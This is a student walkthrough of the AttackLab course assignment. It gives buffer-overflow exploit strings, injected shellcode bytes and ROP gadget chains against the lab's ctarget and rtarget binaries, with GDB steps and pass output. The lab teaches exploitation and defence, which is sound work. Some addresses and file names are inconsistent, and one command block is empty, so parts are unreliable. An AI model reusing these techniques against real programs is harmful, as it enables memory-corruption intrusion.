# AttackLab

This assignment involves generating a total of five attacks on two programs having different security vulnerabilities to learn:  

- ways to exploit security vulnerabilities when programs do not safeguard themselves well enough against buffer overflows.
- how to write programs that are more secure, as well as some of the features provided by compilers and operating systems to make programs less vulnerable.
- stack and parameter-passing mechanisms of x86-64 machine code.
- how x86-64 instructions are encoded.
- experience with debugging tools such as GDB and OBJDUMP.

## PHASE 1
linux> objdump -d ctarget > ctarget.d 

get assembly code ctarget.d, search for getbuf function location
```
000000000040194d <getbuf>:
  40194d:	48 83 ec 38          	sub    $0x38,%rsp
  401951:	48 89 e7             	mov    %rsp,%rdi
  401954:	e8 7e 02 00 00       	callq  401bd7 <Gets>
  401959:	b8 01 00 00 00       	mov    $0x1,%eax
  40195e:	48 83 c4 38          	add    $0x38,%rsp
  401962:	c3                   	retq   
```
BUFFER_SIZE is 0x38, 56 bytes, therefore, the 8-bit storage function return address after 56 bytes. 56 bytes of buffer is allocated for getbuf.

now we know the buffer size and we need to input 56 bytes of padding followed by the return address of the touch1 address. thus we need to find the address of touch1, so lets get the dissembled code for ctarget executable. 

```
0000000000401963 <touch1>:
  401963:	48 83 ec 08          	sub    $0x8,%rsp
  401967:	c7 05 ab 3b 20 00 01 	movl   $0x1,0x203bab(%rip)        # 60551c <vlevel>
  40196e:	00 00 00 
  401971:	bf 95 32 40 00       	mov    $0x403295,%edi
  401976:	e8 55 f3 ff ff       	callq  400cd0 <puts@plt>
  40197b:	bf 01 00 00 00       	mov    $0x1,%edi
  401980:	e8 97 04 00 00       	callq  401e1c <validate>
  401985:	bf 00 00 00 00       	mov    $0x0,%edi
  40198a:	e8 c1 f4 ff ff       	callq  400e50 <exit@plt>
```

thus, location is at 0x401963

construct attack code phase1.txt, as shown below. you can create this in the MobaXterm, files > right click > new file
first 56 bytes are just padding, last line is the address of touch1
when you write the bytes, you need to consider the byte order. our system is little-endian, so the bytes go in reverse order

phase1.txt
```
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
64 19 40 00 00 00 00 00 
```

now we need to take this file and run it through the program hex2raw which will generate raw exploit strings, and then run the raw file. this can be done through command below

```
linux> ./hex2raw < phase1.txt > 2018080106.ctarget.l1
linux> ./ctarget -q -i 2018080106.ctarget.l1
```

or you can run it in one line

```
linux> ./hex2raw < phase1.txt > 2018080106.ctarget.l1; ./ctarget -q -i 2018080106.ctarget.l1
```

if its correct, you should get somethings similar to below
```
Cookie: 0x117fd061
Touch1!: You called touch1()
Valid solution for level 1 with target ctarget
PASS: Would have posted the following:
        user id NoOne
        course  15213-f15
        lab     attacklab
        result  2018080106:PASS:0xffffffff:ctarget:1:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 64 19 40 00 00 00 00 00
```

## PHASE 2 
phase 2 involves injecting a small amount of code as part of your exploit string while making it look like you passed the cookie as an argument to touch2

search for touch2 in our ctarget dump  (right below touch1), it looks something like this

ctarget.d
```
000000000040198f <touch2>:
  40198f:	48 83 ec 08          	sub    $0x8,%rsp
  401993:	89 fa                	mov    %edi,%edx
  401995:	c7 05 7d 3b 20 00 02 	movl   $0x2,0x203b7d(%rip)        # 60551c <vlevel>
  40199c:	00 00 00 
  40199f:	39 3d 7f 3b 20 00    	cmp    %edi,0x203b7f(%rip)        # 605524 <cookie>
  4019a5:	75 20                	jne    4019c7 <touch2+0x38>
  4019a7:	be b8 32 40 00       	mov    $0x4032b8,%esi
  4019ac:	bf 01 00 00 00       	mov    $0x1,%edi
  4019b1:	b8 00 00 00 00       	mov    $0x0,%eax
  4019b6:	e8 45 f4 ff ff       	callq  400e00 <__printf_chk@plt>
  4019bb:	bf 02 00 00 00       	mov    $0x2,%edi
  4019c0:	e8 57 04 00 00       	callq  401e1c <validate>
  4019c5:	eb 1e                	jmp    4019e5 <touch2+0x56>
  4019c7:	be e0 32 40 00       	mov    $0x4032e0,%esi
  4019cc:	bf 01 00 00 00       	mov    $0x1,%edi
  4019d1:	b8 00 00 00 00       	mov    $0x0,%eax
  4019d6:	e8 25 f4 ff ff       	callq  400e00 <__printf_chk@plt>
  4019db:	bf 02 00 00 00       	mov    $0x2,%edi
  4019e0:	e8 f9 04 00 00       	callq  401ede <fail>
  4019e5:	bf 00 00 00 00       	mov    $0x0,%edi
  4019ea:	e8 61 f4 ff ff       	callq  400e50 <exit@plt>
```

similar to phase 1, but according to instruction pdf, it says, "recall that the first argument to a function is passed in the register %rdi"

we have to modify the %rdi register to store our cookie in there. thus, we need to write some assembly code for that task. cookie can be found from result of phase 1. 

create a file called phase2.s and write the code below,

phase2.s 

```
movq $0x117fd061, %rdi
retq
```

we need byte representation of code we wrote above, compile it with gcc then dissasemble it, use these commands
```
linux> gcc -c phase2.s
linux> objdump -d phase2.o > phase2.d
```
or in one line
```
linux> gcc -c phase2.s; objdump -d phase2.o > phase2.d 
```

if we open the file phase2.d we should get something like below

phase2.d
```
phase2.o:     file format elf64-x86-64


Disassembly of section .text:

0000000000000000 <.text>:
   0:	48 c7 c7 61 d0 7f 11 	mov    $0x117fd061,%rdi
   7:	c3                   	retq   

```

the byte representation of the assembly code is 48 c7 c7 61 d0 7f 11 c3, 
now we need to find the address of rsp register using commands

```
gdb> gdb ctarget
gdb> b getbuf
gdb> r -q
gdb> n
gdb> p $rsp
```

looks something like this... 

```
(gdb) b getbuf
Breakpoint 1 at 0x40194d: file buf.c, line 12.
(gdb) r -q
Starting program: /home/2018080106/ctarget -q
Cookie: 0x117fd061

Breakpoint 1, getbuf () at buf.c:12
12      buf.c: Permission denied.
(gdb) n
14      in buf.c
(gdb) p $rsp
$1 = (void *) 0x55612538
```

0x55612538 is the address we want, now create a text file named phase2.txt, remember that the bytes for rsp and touch2 go in reverse. 

phase2.txt
``` 
48 c7 c7 61 d0 7f 11 c3
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
38 25 61 55 00 00 00 00
8f 19 40 00 00 00 00 00
```

tbe first row sets your cookie
the zeroe's are padding to make it 56 bytes
second to last line is address of register %rsp
last line is address of touch2 function

now we run it through hex2raw, using the following commands
```
linux> quit
linux> y
linux> ./hex2raw < phase2.txt > 2018080106.ctarget.l2
linux> ./ctarget -q -i 2018080106.ctargetl2
```
you shoud get the following result

```
Cookie: 0x117fd061
Touch2!: You called touch2(0x117fd061)
Valid solution for level 2 with target ctarget
PASS: Would have posted the following:
        user id NoOne
        course  15213-f15
        lab     attacklab
        result  2018080106:PASS:0xffffffff:ctarget:2:48 C7 C7 61 D0 7F 11 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 38 25 61 55 00 00 00 00 8F 19 40 00 00 00 00 00
```

## Phase 3
Kinda similar to Phase 2, also involves a code injection attack, but passing a string as an argument. The passed paramter $rdi should be changed from a number to a pointer, and the character representation of the cookie should be input. Note that the function hexmatch and strncmp may fill the stack with other data, overwriting it, so we have to be careful where we store it.

Chose to put cookie string at the end to avoid problem of data being overwritten.
total bytes before the cookie are "buffer + 8 bytes for return address of rsp + 8 bytes for touch3".

0x38 + 8 + 8 = 0x48 (72 Decimal)
grab address for rsp from phase 2: 0x55612538
add 0x48
equals 0x55612580, now we need the assembly code, same steps generating the byte representation, lets put it in phase3.s

phase3.s
```
movq $0x55612580, %rdi
retq
```

use commands 
linux > 
linux > 

we should get something like 

phase3.d
```

phase3.o:     file format elf64-x86-64


Disassembly of section .text:

0000000000000000 <.text>:
   0:	48 c7 c7 80 25 61 55 	mov    $0x55612580,%rdi
   7:	c3                   	retq   
```

touch3 address
ctarget.d
```
0000000000401aa0 <touch3>:
  401aa0:	53                   	push   %rbx
  401aa1:	48 89 fb             	mov    %rdi,%rbx
  401aa4:	c7 05 6e 3a 20 00 03 	movl   $0x3,0x203a6e(%rip)        # 60551c <vlevel>
  ...
``` 

Cookie Address in text format: 3131376664303631, use https://www.duplichecker.com/hex-to-text.php (without 0x at front)

grab bytes from above code and start constructing exploit string, create a attack code doc called phase3.txt as shown below

phase3.txt
``` 
48 c7 c7 80 25 61 55 c3	//*rsp + 48 the address where the cookie is present
00 00 00 00 00 00 00 00 //padding 
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
38 25 61 55 00 00 00 00 //return address ($rsp)
a0 1a 40 00 00 00 00 00 //touch3 address
31 31 37 66 64 30 36 31 //cookie string (txt format)
```

Input commands

```
linux> ./hex2raw < phase3.txt > 2018080106.rtarget.l1
linux> ./ctarget -q -i 2018080106.rtarget.l1
```

and you should get something similar to below 
```
Cookie: 0x117fd061
Touch3!: You called touch3("117fd061")
Valid solution for level 3 with target ctarget
PASS: Would have posted the following:
        user id NoOne
        course  15213-f15
        lab     attacklab
        result  2018080106:PASS:0xffffffff:ctarget:3:48 C7 C7 80 25 61 55 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 38 25 61 55 00 00 00 00 A0 1A 40 00 00 00 00 00 31 31 37 66 64 30 36 31
```
## PHASE 4 
phase 4 is different from previous 3 because on this stack target we can't execute code due stack randomization and non-executable memory block. however, according to pdf, we can use ROP (return oriented programming), instead of executing our own code, we look for instructions in the code that do the same thing as we want. We will be using rtarget instead of ctarget. Such segments in code are known as gadgets, and we wil use gadgets to perform our exploitation. 

First execute the following commands to get assembly code for rtarget

```linux> objdump -d rtarget > rtarget.d```

shown below
rtarget.d

```
000000000040194d <getbuf>:
  40194d:	48 83 ec 38          	sub    $0x38,%rsp
  401951:	48 89 e7             	mov    %rsp,%rdi
  401954:	e8 9e 03 00 00       	callq  401cf7 <Gets>
  401959:	b8 01 00 00 00       	mov    $0x1,%eax
  40195e:	48 83 c4 38          	add    $0x38,%rsp
  401962:	c3                   	retq 
```

BUFFER_SIZE=0x38
  
The general idea is to store the cookie in a certain position in the stack, and then if you can directly pop %rdi, you can directly enter the touch2 function. But there is no pop %rdi in gadget, so we need to find another way. After checking, I found that there are two sentences 
```
pop %rax 
movq %rax, %rdi
```
which can be put together to exploit the rtarget program, we can find this in the dissassembled code, there are a lot of functions and the ones we can pic are located between_start farm and end__farm. our two are 

rtarget.d
```
0000000000401b64 <getval_407>:
  401b64:	b8 c2 48 89 c7       	mov    $0xc78948c2,%eax
  401b69:	c3  
```

and 
rtarget.d
```
0000000000401b43 <setval_227>:
  401b43:	c7 07 48 58 90 c3    	movl   $0xc3905848,(%rdi)
  401b49:	c3                   	retq   
```
which give us our two address for popq %rax, movq %rax, %rdi. However, notice that since movq starts on the third byte, we have to add 2 to the address. Do the same for popq. New addresses are shown below
```
movq - 401b64 + 2 = 401b66 
popq - 401b43 + 3 = 401b46
```

create phase4.txt which contains string
padding
gadget 1 address
cookie
gadget 2 address
return address
touch 2 address (shown below)


phase4.txt
```
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
46 1b 40 00 00 00 00 00 // address 1
61 d0 7f 11 00 00 00 00 // cookie
66 1b 40 00 00 00 00 00 // address 2
8f 19 40 00 00 00 00 00 // touch2 location 
```


After running the following commands, we get something like this

```
Cookie: 0x117fd061
Touch2!: You called touch2(0x117fd061)
Valid solution for level 2 with target rtarget
PASS: Would have posted the following:
        user id NoOne
        course  15213-f15
        lab     attacklab
        result  2018080106:PASS:0xffffffff:rtarget:2:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 46 1B 40 00 00 00 00 00 61 D0 7F 11 00 00 00 00 66 1B 40 00 00 00 00 00 8F 19 40 00 00 00 00 00
```

## PHASE 5

create a phase5.txt with the string below.
phase5.txt

```
00 00 00 00 00 00 00 00 // buffer
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
4c 1c 40 00 00 00 00 00
3e 1b 40 00 00 00 00 00
46 1b 40 00 00 00 00 00
48 00 00 00 00 00 00 00 // offset
fc 1b 40 00 00 00 00 00
a7 1b 40 00 00 00 00 00
ac 1b 40 00 00 00 00 00
76 1b 40 00 00 00 00 00
3e 1b 40 00 00 00 00 00
a0 1a 40 00 00 00 00 00	// touch3
31 31 37 66 64 30 36 31 // cookie
```

use the commands below to run it
```
linux> ./hex2raw < phase5.txt > 2018080106.rtarget.l2
linux ./rtarget -q -i 2018080106.rtarget.l2 
```

which should give you output similar to

```
Cookie: 0x117fd061
Touch3!: You called touch3("117fd061")
Valid solution for level 3 with target rtarget
PASS: Would have posted the following:
        user id NoOne
        course  15213-f15
        lab     attacklab
        result  2018080106:PASS:0xffffffff:rtarget:3:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 4C 1C 40 00 00 00 00 00 3E 1B 40 00 00 00 00 00 46 1B 40 00 00 00 00 00 48 00 00 00 00 00 00 00 FC 1B 40 00 00 00 00 00 A7 1B 40 00 00 00 00 00 AC 1B 40 00 00 00 00 00 76 1B 40 00 00 00 00 00 3E 1B 40 00 00 00 00 00 A0 1A 40 00 00 00 00 00 31 31 37 66 64 30 36 31
```

